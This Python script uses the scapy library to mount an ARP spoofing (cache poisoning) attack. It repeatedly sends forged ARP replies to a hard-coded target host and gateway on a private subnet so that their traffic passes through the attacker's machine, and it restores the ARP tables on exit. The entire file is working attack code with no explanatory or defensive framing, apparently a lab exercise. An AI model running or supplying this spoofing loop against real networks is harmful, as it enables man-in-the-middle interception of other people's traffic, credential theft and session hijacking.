import scapy.all as scapy
import time
import sys

def getMAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    brdcst = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_brdcst = brdcst/arp_request
    answeredList = scapy.srp(arp_brdcst, timeout=1, verbose=0)[0]

    return answeredList[0][1].hwsrc

def spoof(targetIP, spoofIP):
    targetMAC = getMAC(targetIP)
    # print("\n" + targetIP + " --> " + targetMAC + "\n")
    ether = scapy.Ether(dst=targetMAC)
    ARPpacket = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    packet = ether / ARPpacket
    # packet.show()
    scapy.sendp(packet, verbose=0)

def restore(destIP, srcIP):
    destMAC = getMAC(destIP)
    srcMAC = getMAC(srcIP)
    restorePacket = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
    scapy.sendp(restorePacket, verbose=0, count=4)

targetIP = "192.168.101.128"
gatewayIP = "192.168.101.2"

try:
    packetsCount = 0
    while True:
        spoof(targetIP, gatewayIP)
        spoof(gatewayIP, targetIP)
        packetsCount += 2
        print("\r[+] Sent " + str(packetsCount) + " packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n>>Ctrl+C detected; Restoring ARP tables and exiting program...")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)